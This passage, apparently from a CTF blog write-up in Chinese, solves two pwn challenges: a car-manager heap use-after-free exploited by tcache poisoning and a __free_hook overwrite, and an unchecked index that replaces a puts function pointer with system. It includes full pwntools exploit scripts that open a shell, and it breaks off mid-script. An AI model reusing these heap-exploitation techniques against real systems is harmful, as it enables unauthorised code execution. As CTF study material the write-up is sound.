<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55c8ed9ee190</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55c8ed9ee190</span> —▸ <span class="number">0x55c8ed9ee110</span> —▸ <span class="number">0x55c8ed9ee0f0</span> —▸ <span class="number">0x55c8ed9ee0d0</span> —▸ <span class="number">0x55c8ed9edfa0</span> ◂— ...</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55c8ed9ee198</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55c8ed9ee1a0</span> —▸ <span class="number">0x55c8ed9edf30</span> —▸ <span class="number">0x55c8ed9edf40</span> ◂— <span class="string">&#x27;00000000&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55c8ed9ee1a8</span> —▸ <span class="number">0x55c8ed9ee040</span> —▸ <span class="number">0x55c8ed9ee050</span> ◂— <span class="string">&#x27;11111111&#x27;</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55c8ed9ee1b0</span> —▸ <span class="number">0x55c8ed9ee130</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果释放的 chunk 是最后一个，则不会有特殊操作</li>
</ul>
<p>真正的 UAF 在复制模块中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(car_copy, car_src); <span class="comment">// 复制car的make</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(car_copy-&gt;model_basic_string, car_src-&gt;model_basic_string);</span><br><span class="line">car_copy-&gt;year = car_src-&gt;year;</span><br><span class="line">result = car_src-&gt;tire.data[<span class="number">1</span>];</span><br><span class="line">car_copy-&gt;tire.data[<span class="number">0</span>] = car_src-&gt;tire.data[<span class="number">0</span>];</span><br><span class="line">car_copy-&gt;tire.data[<span class="number">1</span>] = result;</span><br><span class="line">result = car_src-&gt;tire.data[<span class="number">2</span>];</span><br><span class="line">result = car_src-&gt;tire.data[<span class="number">3</span>];</span><br><span class="line">car_copy-&gt;tire.data[<span class="number">2</span>] = result;</span><br><span class="line">car_copy-&gt;tire.data[<span class="number">3</span>] = result;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 copy 会直接拷贝 <code>car-&gt;tire.data</code>，这样会导致两个不同的 <code>car</code> 占据同一个 <code>tire.data</code></li>
<li>如果将其中一个 <code>car</code> 释放，就可以通过另一个 <code>car</code> 来修改 tcache chunk</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>利用 UAF 可以快速泄露 heap_base：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i)*<span class="number">8</span>,<span class="string">&quot;1&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">copy(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Car 4:&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Tire Sizes: 0, &quot;</span>)</span><br><span class="line">leak_addr1 = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;,&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">p.recvuntil(<span class="string">&quot;Tire Pressures: 0, &quot;</span>)</span><br><span class="line">leak_addr2 = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;,&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">leak_addr = leak_addr1 + leak_addr2 * <span class="number">0x100000000</span></span><br><span class="line">heap_base = leak_addr - <span class="number">0x11eb0</span> </span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>泄露 heap_base 后就可以修改 tcache-&gt;next 来实现堆重叠，进而修改 chunk-&gt;size 拿到 unsorted chunk，然后泄露 libc_base</p>
<p>最后劫持 tcache-&gt;next 到 free_hook，并注入 “/bin/sh\x00” + system 就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./car_manager1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x295C)\n&quot;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Please enter your choice:&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">make,mod,year=<span class="number">2024</span>,size=<span class="number">0</span>,pressure=<span class="number">0</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter the make of the car:&quot;</span>,make)</span><br><span class="line">    sla(<span class="string">&quot;Enter the model of the car:&quot;</span>,mod)</span><br><span class="line">    sla(<span class="string">&quot; Enter the year of the car: &quot;</span>,<span class="built_in">str</span>(year))</span><br><span class="line">    sla(<span class="string">&quot;Enter the size of tire :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Enter the pressure of tire :&quot;</span>,<span class="built_in">str</span>(pressure))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter the index of the car to delete:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span>(<span class="params">make,mod,year=<span class="number">2024</span></span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter the make of the car to find:&quot;</span>,make)</span><br><span class="line">    sla(<span class="string">&quot;Enter the model of the car to find:&quot;</span>,mod)</span><br><span class="line">    sla(<span class="string">&quot;Enter the year of the car to find:&quot;</span>,year)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,make,model,year=<span class="number">2024</span>,key=<span class="number">1</span>,index2=<span class="number">0</span>,size=<span class="number">0</span>,pressure=<span class="number">0</span></span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter the index of the car to modify:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;Enter the new make of the car:&quot;</span>,make)</span><br><span class="line">    sla(<span class="string">&quot;Enter the new model of the car:&quot;</span>,model)</span><br><span class="line">    sla(<span class="string">&quot;Enter the new year of the car&quot;</span>,<span class="built_in">str</span>(year))</span><br><span class="line">    sla(<span class="string">&quot;Do you want to change all tires?(1/0)&quot;</span>,<span class="built_in">str</span>(key))</span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0</span>):</span><br><span class="line">        sla(<span class="string">&quot;Enter the idx of tire :&quot;</span>,<span class="built_in">str</span>(index2))</span><br><span class="line">        sla(<span class="string">&quot;Enter the new size of tire :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        sla(<span class="string">&quot;Enter the new pressure of tire :&quot;</span>,<span class="built_in">str</span>(pressure))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;Enter the new size of tire :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        sla(<span class="string">&quot;Enter the new pressure of tire :&quot;</span>,<span class="built_in">str</span>(pressure))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter the index of the car to copy:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    cmd(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i)*<span class="number">8</span>,<span class="string">&quot;1&quot;</span>,size=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">copy(<span class="number">0</span>)</span><br><span class="line">copy(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Car 19:&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Tire Sizes: &quot;</span>)</span><br><span class="line">leak_addr1 = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;,&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">p.recvuntil(<span class="string">&quot;Tire Pressures: &quot;</span>)</span><br><span class="line">leak_addr2 = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;,&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">leak_addr = leak_addr1 + leak_addr2 * <span class="number">0x100000000</span></span><br><span class="line">heap_base = leak_addr - <span class="number">0x134d0</span> </span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">magic_addr = heap_base + <span class="number">0x12018</span></span><br><span class="line">magic_addr1 = magic_addr &amp; <span class="number">0xffffffff</span></span><br><span class="line">magic_addr2 = magic_addr &gt;&gt; <span class="number">32</span></span><br><span class="line">success(<span class="string">&quot;magic_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(magic_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">19</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,key=<span class="number">0</span>,index2=<span class="number">0</span>,size=magic_addr1,pressure=magic_addr2)</span><br><span class="line">add(<span class="string">&quot;p&quot;</span>*<span class="number">0x40</span>,<span class="string">&quot;p&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="string">&quot;o&quot;</span>*<span class="number">0x8</span>,<span class="string">&quot;o&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">22</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,key=<span class="number">0</span>,index2=<span class="number">0</span>,size=<span class="number">0x441</span>)</span><br><span class="line">dele(<span class="number">20</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Car 0:&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">leak_addr1 = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">p.recvuntil(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">leak_addr2 = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">leak_addr = leak_addr1 + leak_addr2 * <span class="number">0x100000000</span></span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>] - <span class="number">8</span></span><br><span class="line">free_hook1 = free_hook &amp; <span class="number">0xffffffff</span></span><br><span class="line">free_hook2 = free_hook &gt;&gt; <span class="number">32</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">copy(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">21</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,key=<span class="number">0</span>,index2=<span class="number">0</span>,size=free_hook1,pressure=free_hook2)</span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span>+p64(system)</span><br><span class="line">add(payload,<span class="string">&quot;o&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="over"><a href="#over" class="headerlink" title="over"></a>over</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=d6a2a043e8258849ba2b9c5fd02bb700a0713f20, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">writen(<span class="string">&quot;some add\n&quot;</span>);</span><br><span class="line">num2 = *((_DWORD *)&amp;data + num1 + <span class="number">12</span>) + readn();</span><br><span class="line">result = &amp;data;</span><br><span class="line">*((_DWORD *)&amp;data + num1 + <span class="number">12</span>) = num2;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于 num1 和 num2 的限制不到位，因此可以覆盖函数指针 func</li>
<li>函数指针 func 在如下函数中完成初始化：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> (**init_s())(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> (**result)(<span class="keyword">const</span> <span class="keyword">char</span> *); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  result = &amp;<span class="built_in">puts</span>;</span><br><span class="line">  func = (__int64 (__fastcall *)(_QWORD))&amp;<span class="built_in">puts</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>通过溢出可以覆盖函数指针，计算 puts system 之间的偏移，然后修改 puts 为 system 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.16.9.41&#x27;</span>,<span class="string">&#x27;8888&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x12D3)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;do\n&quot;</span>,<span class="built_in">str</span>(op))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op1</span>(<span class="params">num1,num2</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;choose&quot;</span>,num1)</span><br><span class="line">    sla(<span class="string">&quot;add\n&quot;</span>,<span class="built_in">str</span>(num2))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">op1(<span class="string">&quot;-2&quot;</span>,<span class="string">&quot;-205200&quot;</span>)</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">00:0000│  0x561dca9c8088 —▸ 0x7f9884234420 (puts) ◂— endbr64</span></span><br><span class="line"><span class="string">pwndbg&gt; 